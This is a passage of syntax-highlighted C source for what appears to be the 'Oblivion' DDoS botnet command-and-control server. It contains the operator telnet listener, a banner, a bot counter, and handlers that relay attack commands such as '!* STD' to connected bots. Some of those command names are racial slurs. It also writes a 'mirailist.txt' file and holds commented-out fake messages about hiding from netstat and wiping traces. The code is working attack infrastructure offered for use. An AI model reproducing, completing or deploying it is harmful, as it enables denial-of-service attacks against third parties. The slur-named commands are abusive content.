ascii_banner_line7 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line8 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line9 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line10 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line11 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> *root223[<span class="number">1024</span>];</span><br><span class="line">		<span class="keyword">char</span> *root224[<span class="number">1024</span>];</span><br><span class="line">		<span class="keyword">char</span> *root225[<span class="number">1024</span>];</span><br><span class="line">		<span class="keyword">char</span> *root226[<span class="number">1024</span>];</span><br><span class="line">		</span><br><span class="line">		  <span class="keyword">char</span> spinBuf[<span class="number">4</span>]=&#123;<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;|&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/*</span></span><br><span class="line"><span class="comment">		sprintf(root226, &quot;\x1b[%s Loading Oblivion By Yuh | @RealBoyYuh [ %d %]\r\n\r\n&quot;, colorCodes[rand() % 5]);</span></span><br><span class="line"><span class="comment">		sleep(.9);</span></span><br><span class="line"><span class="comment">		if(send(thefd, &quot;\x1b[31m[x] DDOS | Succesfully hijacked connection.\r\n&quot;, 55, MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		sleep(1.7);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">		if(send(thefd, &quot;\x1b[33m[x] DDOS | Masking connection from utmp+wtmp...\r\n&quot;, 59, MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		sleep(1.2);</span></span><br><span class="line"><span class="comment">		if(send(thefd, &quot;\x1b[35m[x] DDOS | Hiding from netstat...\r\n&quot;, 46, MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		sleep(1);</span></span><br><span class="line"><span class="comment">		if(send(thefd, &quot;\x1b[36m[x] DDOS | Removing all traces of LD_PRELOAD...\r\n&quot;, 57, MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		sleep(1.7);</span></span><br><span class="line"><span class="comment">		int ii;</span></span><br><span class="line"><span class="comment">		for( ii = 0; ii &lt; 5; ii++ )</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">        sleep(.9);</span></span><br><span class="line"><span class="comment">		sprintf(root224, &quot;\x1b[%s [x] DDOS | Wiping env libc.poison.so.%d\r\n&quot;, colorCodes[rand() % 5], ii + 1 );</span></span><br><span class="line"><span class="comment">		if(send(thefd, root224, strlen(root224), MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		sleep(.6);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		sleep(1.3);</span></span><br><span class="line"><span class="comment">		if(send(thefd, &quot;\x1b[31m[X] DDOS | Setting up virtual terminal...\r\n&quot;, 44, MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		if(send(thefd, &quot;\x1b[34m\r\n[X] DDOS | FINISHED, RUNNING EXISTING PAYLOAD!\r\n&quot;, 44, MSG_NOSIGNAL) == -1) goto end;</span></span><br><span class="line"><span class="comment">		sleep(4.5);</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">if</span> (send(thefd, <span class="string">&quot;\033[1A\033[2J\033[1;1H&quot;</span>, <span class="number">14</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line1, <span class="string">&quot; \x1b[%s                                                                    \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line2, <span class="string">&quot; \x1b[%s            \x1b[%s ,,       \x1b[%s ,,   \x1b[%s ,,   \x1b[%s           ,, \x1b[%s    \x1b[%s                \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line3, <span class="string">&quot; \x1b[%s   .g8&quot;</span><span class="string">&quot;8q. \x1b[%s  *MM     \x1b[%s `7MM    db       \x1b[%s       db     \x1b[%s     \x1b[%s           \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line4, <span class="string">&quot; \x1b[%s.dP&#x27;    `YM.\x1b[%s MM       \x1b[%s MM               \x1b[%s            \x1b[%s     \x1b[%s           \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line5, <span class="string">&quot; \x1b[%sdM&#x27;      `MM \x1b[%sMM,dMMb.  \x1b[%sMM  \x1b[%s`7MM \x1b[%s`7M&#x27;   `MF&#x27;\x1b[%s`7MM \x1b[%s ,pW&#x27;Wq.\x1b[%s`7MMpMMMb.  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line6, <span class="string">&quot; \x1b[%sMM        MM \x1b[%sMM    `Mb \x1b[%sMM  \x1b[%s  MM  \x1b[%s VA   ,V   \x1b[%s MM \x1b[%s6W&#x27;   `Wb \x1b[%sMM    MM  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line7, <span class="string">&quot; \x1b[%sMM.      ,MP \x1b[%sMM     M8 \x1b[%sMM  \x1b[%s  MM   \x1b[%s VA ,V   \x1b[%s  MM \x1b[%s8M     M8 \x1b[%sMM    MM  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line8, <span class="string">&quot; \x1b[%s`Mb.    ,dP&#x27;\x1b[%s MM.   ,M9 \x1b[%sMM   \x1b[%s MM    \x1b[%s VVV    \x1b[%s  MM \x1b[%sYA.   ,A9 \x1b[%sMM    MM  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line9, <span class="string">&quot; \x1b[%s  &#x27;&#x27;bmmd&#x27;&#x27;  \x1b[%s P^YbmdP&#x27;\x1b[%s.JMML..\x1b[%sJMML.   \x1b[%s W    \x1b[%s .JMML.\x1b[%s`Ybmd9&#x27;\x1b[%s.JMML  JMML.\r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line1, <span class="built_in">strlen</span>(ascii_banner_line1), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line2, <span class="built_in">strlen</span>(ascii_banner_line2), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line3, <span class="built_in">strlen</span>(ascii_banner_line3), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line4, <span class="built_in">strlen</span>(ascii_banner_line4), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line5, <span class="built_in">strlen</span>(ascii_banner_line5), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line6, <span class="built_in">strlen</span>(ascii_banner_line6), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line7, <span class="built_in">strlen</span>(ascii_banner_line7), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line8, <span class="built_in">strlen</span>(ascii_banner_line8), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line9, <span class="built_in">strlen</span>(ascii_banner_line9), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;                  \x1b[%s\r\nWelcome,\x1b[34m %s\x1b[%s To the Oblivion\r\n\r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], usernames, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(root223, <span class="string">&quot;\x1b[%s~$ \x1b[0;37m &quot;</span>, colorCodes[rand() % <span class="number">5</span>], usernames);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, root223, <span class="built_in">strlen</span>(root223), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">pthread_create(&amp;title, <span class="literal">NULL</span>, &amp;titleWriter, sock);</span><br><span class="line">managements[thefd].connected = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(fdgets(buf, <span class="keyword">sizeof</span> buf, thefd) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, <span class="string">&quot;SHOW&quot;</span>, <span class="number">4</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;BOTS&quot;</span>, <span class="number">4</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;bots&quot;</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;[\x1b[36m+\x1b[37m] Bots Online: %d [\x1b[31m-\x1b[37m] Users Online: %d [\x1b[36m+\x1b[37m]\r\n&quot;</span>, clientsConnected(), managesConnected);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, <span class="string">&quot;!* STD&quot;</span>, <span class="number">6</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;!* NIGGGER&quot;</span>, <span class="number">6</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;!* BIGGGEWR&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;[\x1b[36m+\x1b[37m] Successfully Sent Attack [\x1b[36m+\x1b[37m]\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;PORT_SCAN&quot;</span>)) &#123;</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;Open Ports %s, %s\r\n&quot;</span>, ports[(rand() % <span class="number">8</span>)], ports[(rand() % <span class="number">8</span>)]);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, <span class="string">&quot;CLEAR&quot;</span>, <span class="number">5</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;clear&quot;</span>, <span class="number">5</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;cls&quot;</span>, <span class="number">3</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;CLS&quot;</span>, <span class="number">3</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;\r\n       \x1b[%s\r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="keyword">if</span> (send(thefd, <span class="string">&quot;\033[1A\033[2J\033[1;1H&quot;</span>, <span class="number">14</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line1, <span class="string">&quot; \x1b[%s                                                                    \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line2, <span class="string">&quot; \x1b[%s            \x1b[%s ,,       \x1b[%s ,,   \x1b[%s ,,   \x1b[%s           ,, \x1b[%s    \x1b[%s                \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line3, <span class="string">&quot; \x1b[%s   .g8&quot;</span><span class="string">&quot;8q. \x1b[%s  *MM     \x1b[%s `7MM    db       \x1b[%s       db     \x1b[%s     \x1b[%s           \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line4, <span class="string">&quot; \x1b[%s.dP&#x27;    `YM.\x1b[%s MM       \x1b[%s MM               \x1b[%s            \x1b[%s     \x1b[%s           \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line5, <span class="string">&quot; \x1b[%sdM&#x27;      `MM \x1b[%sMM,dMMb.  \x1b[%sMM  \x1b[%s`7MM \x1b[%s`7M&#x27;   `MF&#x27;\x1b[%s`7MM \x1b[%s ,pW&#x27;Wq.\x1b[%s`7MMpMMMb.  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line6, <span class="string">&quot; \x1b[%sMM        MM \x1b[%sMM    `Mb \x1b[%sMM  \x1b[%s  MM  \x1b[%s VA   ,V   \x1b[%s MM \x1b[%s6W&#x27;   `Wb \x1b[%sMM    MM  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line7, <span class="string">&quot; \x1b[%sMM.      ,MP \x1b[%sMM     M8 \x1b[%sMM  \x1b[%s  MM   \x1b[%s VA ,V   \x1b[%s  MM \x1b[%s8M     M8 \x1b[%sMM    MM  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line8, <span class="string">&quot; \x1b[%s`Mb.    ,dP&#x27;\x1b[%s MM.   ,M9 \x1b[%sMM   \x1b[%s MM    \x1b[%s VVV    \x1b[%s  MM \x1b[%sYA.   ,A9 \x1b[%sMM    MM  \r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="built_in">sprintf</span>(ascii_banner_line9, <span class="string">&quot; \x1b[%s  &#x27;&#x27;bmmd&#x27;&#x27;  \x1b[%s P^YbmdP&#x27;\x1b[%s.JMML..\x1b[%sJMML.   \x1b[%s W    \x1b[%s .JMML.\x1b[%s`Ybmd9&#x27;\x1b[%s.JMML  JMML.\r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line">	<span class="keyword">if</span>(send(thefd, ascii_banner_line1, <span class="built_in">strlen</span>(ascii_banner_line1), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line2, <span class="built_in">strlen</span>(ascii_banner_line2), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line3, <span class="built_in">strlen</span>(ascii_banner_line3), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line4, <span class="built_in">strlen</span>(ascii_banner_line4), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line5, <span class="built_in">strlen</span>(ascii_banner_line5), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line6, <span class="built_in">strlen</span>(ascii_banner_line6), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line7, <span class="built_in">strlen</span>(ascii_banner_line7), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line8, <span class="built_in">strlen</span>(ascii_banner_line8), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">		<span class="keyword">if</span>(send(thefd, ascii_banner_line9, <span class="built_in">strlen</span>(ascii_banner_line9), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;                  \x1b[%s\r\nWelcome,\x1b[34m %s\x1b[%s To the Oblivion\r\n\r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], usernames, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">pthread_create(&amp;title, <span class="literal">NULL</span>, &amp;titleWriter, sock);</span><br><span class="line">managements[thefd].connected = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, <span class="string">&quot;exit&quot;</span>, <span class="number">4</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;EXIT&quot;</span>, <span class="number">4</span>) == <span class="number">0</span> || <span class="built_in">strncmp</span>(buf, <span class="string">&quot;LOGOUT&quot;</span>, <span class="number">6</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line">trim(buf);</span><br><span class="line"><span class="keyword">char</span> *root2[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(root2, <span class="string">&quot;\x1b[%s~$ \x1b[0;37m &quot;</span>, colorCodes[rand() % <span class="number">5</span>], usernames);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, root2, <span class="built_in">strlen</span>(root2), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(buf) == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: \&quot;%s\&quot;\n&quot;</span>,accounts[find_line].id, buf);</span><br><span class="line">FILE *logFile;</span><br><span class="line">logFile = fopen(<span class="string">&quot;report.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(logFile, <span class="string">&quot;%s: \&quot;%s\&quot;\n&quot;</span>,accounts[find_line].id, buf);</span><br><span class="line">fclose(logFile);</span><br><span class="line">broadcast(buf, thefd, usernames);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">&#125;</span><br><span class="line">end: <span class="comment">// cleanup dead socket</span></span><br><span class="line">managements[thefd].connected = <span class="number">0</span>;</span><br><span class="line">close(thefd);</span><br><span class="line">managesConnected--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">telnetListener</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sockfd, newsockfd;</span><br><span class="line"><span class="keyword">socklen_t</span> clilen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>, <span class="title">cli_addr</span>;</span></span><br><span class="line">sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sockfd &lt; <span class="number">0</span>) perror(<span class="string">&quot;ERROR opening socket&quot;</span>);</span><br><span class="line">bzero((<span class="keyword">char</span> *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">serv_addr.sin_port = htons(port);</span><br><span class="line"><span class="keyword">if</span> (bind(sockfd, (struct sockaddr *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) &lt; <span class="number">0</span>) perror(<span class="string">&quot;ERROR on binding&quot;</span>);</span><br><span class="line">listen(sockfd,<span class="number">5</span>);</span><br><span class="line">clilen = <span class="keyword">sizeof</span>(cli_addr);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen);</span><br><span class="line"><span class="keyword">if</span> (newsockfd &lt; <span class="number">0</span>) perror(<span class="string">&quot;ERROR on accept&quot;</span>);</span><br><span class="line"><span class="keyword">pthread_t</span> thread;</span><br><span class="line">pthread_create( &amp;thread, <span class="literal">NULL</span>, &amp;telnetWorker, (<span class="keyword">void</span> *)newsockfd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">void</span> *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">signal(SIGPIPE, SIG_IGN); <span class="comment">// ignore broken pipe errors sent from kernel</span></span><br><span class="line"><span class="keyword">int</span> s, threads, port;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s [port] [threads] [cnc-port]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span> (EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">port = atoi(argv[<span class="number">3</span>]);</span><br><span class="line">telFD = fopen(<span class="string">&quot;mirailist.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">threads = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">listenFD = create_and_bind (argv[<span class="number">1</span>]); <span class="comment">// try to create a listening socket, die if we can&#x27;t</span></span><br><span class="line"><span class="keyword">if</span> (listenFD == <span class="number">-1</span>) <span class="built_in">abort</span> ();</span><br><span class="line">s = make_socket_non_blocking (listenFD); <span class="comment">// try to make it nonblocking, die if we can&#x27;t</span></span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) <span class="built_in">abort</span> ();</span><br><span class="line">s = listen (listenFD, SOMAXCONN); <span class="comment">// listen with a huuuuge backlog, die if we can&#x27;t</span></span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;listen&quot;</span>);</span><br><span class="line"><span class="built_in">abort</span> 